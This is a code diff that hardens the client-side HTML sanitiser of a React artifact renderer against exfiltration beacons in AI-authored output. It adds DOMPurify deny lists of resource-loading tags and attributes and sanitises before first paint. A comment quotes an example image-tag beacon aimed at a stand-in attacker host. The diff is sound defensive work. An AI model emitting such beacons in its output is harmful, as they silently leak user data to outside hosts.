@@ -25,7 +25,7 @@
  * response can be augmented client-side without divergence.
  */
 
-import { useEffect, useMemo, useState } from 'react';
+import { useMemo } from 'react';
 import DOMPurify from 'dompurify';
 import { dataAStrings as S } from '@/i18n/strings/data-a';
 
@@ -78,23 +78,71 @@ const RETRY_SW = S.artifactRenderer.retry.sw;
 const RETRY_EN = S.artifactRenderer.retry.en;
 
 /**
+ * Tags that fetch a remote resource the moment they paint. An
+ * AI-authored artifact body is untrusted (OWASP LLM05): a single
+ * `<img src="https://attacker/beacon?d=…">` exfiltrates whatever the
+ * URL encodes the instant the browser renders it, with no click. We
+ * forbid every auto-loading element so the renderer can never become a
+ * silent egress channel. Document markup (headings, tables, lists,
+ * `<a href>` links, code) is unaffected — anchors only fetch on a
+ * deliberate click, and `rel`/`target` keep that navigation safe.
+ */
+const RESOURCE_LOADING_TAGS = [
+  'img',
+  'picture',
+  'source',
+  'srcset',
+  'audio',
+  'video',
+  'track',
+  'iframe',
+  'embed',
+  'object',
+  'link',
+  'svg',
+  'use',
+  'image',
+] as const;
+
+/**
+ * Attributes that pull a remote URL even when no resource tag survives
+ * (CSS `background`, form `formaction`, hyperlink-audit `ping`, the
+ * `src*`/`*://` loaders). Stripped alongside the inline-style vectors so
+ * a beacon cannot ride in on an attribute.
+ */
+const RESOURCE_LOADING_ATTRS = [
+  'src',
+  'srcset',
+  'poster',
+  'background',
+  'lowsrc',
+  'dynsrc',
+  'formaction',
+  'ping',
+  'style',
+] as const;
+
+/**
  * Client-side defense-in-depth sanitiser. The artifact HTML is already
  * sanitised server-side by `services/artifact-richness`; DOMPurify is a
  * second, independent barrier so a pipeline regression can never paint
  * active content (scripts, event handlers, javascript: URLs, inline
  * styles) in the owner's browser. Standard document markup (headings,
- * tables, lists, links, code) is preserved — only XSS vectors are
+ * tables, lists, links, code) is preserved — active content AND every
+ * remote-resource-loading vector (the LLM05 exfil-beacon class) are
  * stripped. Per CLAUDE.md: "No raw HTML interpolation — DOMPurify wraps
  * required."
  */
 function sanitizeArtifactHtml(html: string): string {
   // SSR pass-through: the server pipeline already sanitised it, and
-  // DOMPurify needs a DOM. The client re-sanitises after mount.
+  // DOMPurify needs a DOM. The client re-sanitises before first paint
+  // (the impl is `next/dynamic({ ssr: false })`, so the client path
+  // always runs and the seeded state is never raw).
   if (typeof window === 'undefined') return html;
   return DOMPurify.sanitize(html, {
     ADD_ATTR: ['target', 'rel'],
-    FORBID_TAGS: ['style'],
-    FORBID_ATTR: ['style'],
+    FORBID_TAGS: [...RESOURCE_LOADING_TAGS],
+    FORBID_ATTR: [...RESOURCE_LOADING_ATTRS],
   });
 }
 
@@ -171,28 +219,23 @@ function ArtifactBody(props: {
   readonly tocHtml: string | null;
   readonly footnotesHtml: string | null;
 }): JSX.Element {
-  // Initial render mirrors the server-sanitised HTML so hydration never
-  // mismatches; after mount, DOMPurify re-sanitises client-side as the
-  // second barrier.
-  const [clean, setClean] = useState<{
-    readonly body: string;
-    readonly toc: string | null;
-    readonly footnotes: string | null;
-  }>({
-    body: props.bodyHtml,
-    toc: props.tocHtml,
-    footnotes: props.footnotesHtml,
-  });
-
-  useEffect(() => {
-    setClean({
+  // Sanitise SYNCHRONOUSLY, before the first paint. Seeding state with the
+  // raw body and only cleaning it in a post-mount effect would render one
+  // frame of unsanitised, AI-authored HTML — an exfil beacon fires on that
+  // frame regardless of any later scrub. `useMemo` runs during render, so
+  // the very first DOM the owner ever sees is already DOMPurify-clean. The
+  // impl is `next/dynamic({ ssr: false })`, so this client path is the only
+  // path and there is no raw-HTML frame to hydrate from.
+  const clean = useMemo(
+    () => ({
       body: sanitizeArtifactHtml(props.bodyHtml),
       toc: props.tocHtml ? sanitizeArtifactHtml(props.tocHtml) : null,
       footnotes: props.footnotesHtml
         ? sanitizeArtifactHtml(props.footnotesHtml)
         : null,
-    });
-  }, [props.bodyHtml, props.tocHtml, props.footnotesHtml]);
+    }),
+    [props.bodyHtml, props.tocHtml, props.footnotesHtml],
+  );
 
   return (
     <main className="borjie-artifact-body">
